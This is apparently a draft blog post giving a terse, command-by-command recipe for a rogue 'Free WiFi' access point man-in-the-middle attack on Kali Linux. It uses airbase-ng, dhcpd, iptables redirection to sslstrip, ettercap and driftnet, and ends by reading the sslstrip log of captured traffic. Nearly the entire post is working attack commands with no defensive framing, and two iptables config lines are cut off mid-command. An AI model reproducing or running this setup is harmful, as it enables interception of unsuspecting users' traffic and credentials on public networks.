---
layout: post
title: Kali Linux Wireless SSL Spoofing
meta: Man-in-the-middle attack
posted: 6-6-2015
category: blog
draft: true
---

<h2>Prerequisites</h2>
<code>cd /etc/ettercap</code><br>
<code>cp etter.conf etter.conf.backup</code><br>
<code>nano etter.conf</code>

```
# Set PID numbers to 0
[privs]
ec_uid = 0
ec_gid = 0

# Uncomment Iptables
redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %por$
redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %po$
```

<h2>Configuring Hotspot</h2>

<p>Use the built in Debian hotspot feature.</p>

<code>nano /etc/dhcp/dhcpd.conf</code>

```
authoritative;
default-lease-time 600;
max-lease-time 7200;

subnet 10.0.0.0 netmask 255.255.255.0 {
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;

option domain-name "freewifi";
option domain-name-servers 10.0.0.1;

range 10.0.0.20 10.0.0.50;
}
```

<p>or,</p>


<code>ifconfig wlan0 down</code><br>
<code>ifconfig wlan0 mode monitor</code><br>
<code>ifconfig wlan0 up</code><br>
<code>pkill dhclient</code><br>
<code>airbase-ng -c 11 -e "Free WiFi" wlan0</code>


<hr>


<h2>Setting iptables</h2>

<code>ifconfig at0 10.0.0.1 netmask 255.255.255.0</code><br>
<code>ifconfig at0 mtu 1400</code><br>
<code>route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1</code><br>
<code>echo 1 > /proc/sys/net/ipv4/ip_forward</code><br>
<code>iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.1.1</code><br>
<code>iptables -P FORWARD ACCEPT</code><br>
<code>iptables --append FORWARD --in-interface at0 -j ACCEPT</code><br>
<code>iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE</code><br>
<code>iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000</code><br>
<code>dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhclient-eth0.pid at0</code><br>
<code>service isc-dhcp-server start</code><br>
<p>then,</p>
<code>sslstrip -f -p -k 10000</code>

<hr>

<h2>Ettercap at0 Interface</h2>
<code>ettercap -p -u -T -q -i at0</code>

<p>and,</p>

<h2>Running Driftnet</h2>
<code>driftnet -i eth0</code>


<hr>


<h2>Other Useful Commands</h2>

<h3>Discover Network Devices</h3>
<code>netdiscover</code><br>
<p>Nmap with output gateway ip</p>
<code>nmap -sS -O 192.168.1.1/24</code>

<h3>Open a Terminal</h3>
<code>cat sslstrip.log</code>

